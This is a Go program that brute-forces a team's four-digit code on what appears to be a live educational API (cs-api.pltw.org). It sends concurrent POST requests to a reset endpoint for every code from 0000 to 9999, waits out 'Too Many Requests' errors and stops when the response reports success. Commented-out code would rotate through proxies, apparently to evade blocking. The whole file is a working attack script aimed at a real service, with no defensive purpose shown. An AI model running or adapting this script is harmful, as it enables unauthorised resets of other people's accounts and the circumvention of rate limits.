package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	// proxies, err := readProxies("proxies.txt")
	// if err != nil {
	// 	panic(err)
	// }

	// fmt.Println("Testing proxies... ")

	// proxies = filterWorkingProxies(proxies)
	// fmt.Println("Working proxies:", len(proxies), "")

	// if len(proxies) == 0 {
	// 	fmt.Println("No working proxies found. Exiting ")
	// 	return
	// }

	teamName := "joeteam"
	if len(os.Args) > 1 {
		teamName = os.Args[1]
		fmt.Print(os.Args[1], " code is ")
	} else {
		fmt.Println("No team name!")
		os.Exit(1)
	}

	threadCount := 20
	totalCodes := 9999
	chunkSize := totalCodes / threadCount // divide codes among proxies
	var wg sync.WaitGroup
	sem := make(chan struct{}, 50) // concurrency limit

	for i := range threadCount {
		start := i * chunkSize
		end := start + chunkSize - 1
		if i == threadCount-1 {
			end = totalCodes - 1 // make sure last proxy goes to the end
		}

		wg.Add(1)
		go func(start, end int) {
			defer wg.Done()
			for code := start; code <= end; code++ {
				sem <- struct{}{} // acquire slot
				err := sendRequest(code, teamName)
				<-sem // release slot

				if err != nil {
					if strings.Contains(err.Error(), "context deadline exceeded") {
						//							fmt.Println("⏱️ Proxy timed out:", proxy)
						return
					}
				}
			}
		}(start, end)
	}

	wg.Wait()

	fmt.Print("unknown; it does not exist.\n")
}

func sendRequest(code int, team string) error {
	// proxyURL, err := url.Parse("http://" + proxyStr)
	// if err != nil {
	// 	return err
	// }

	client := &http.Client{
		// Transport: &http.Transport{
		// 	Proxy: http.ProxyURL(proxyURL),
		// },
	}

	payload := map[string]string{}
	data, _ := json.Marshal(payload)

	for {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		fmturl := fmt.Sprintf("https://cs-api.pltw.org/%s/reset?password=%04d", team, code)
		// fmt.Println(fmturl)
		req, _ := http.NewRequestWithContext(ctx, "POST", fmturl, bytes.NewBuffer(data))
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			if strings.Contains(err.Error(), "context deadline exceeded") {
				return err // main loop removes proxy
			}
			if strings.Contains(err.Error(), "Too Many Requests") {
				time.Sleep(10 * time.Second)
				continue
			}
			return err
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), "has been cleared") {
			fmt.Print(fmt.Sprintf("%04d", code), ".\n")
			os.Exit(0)
		}

		break
	}

	return nil
}
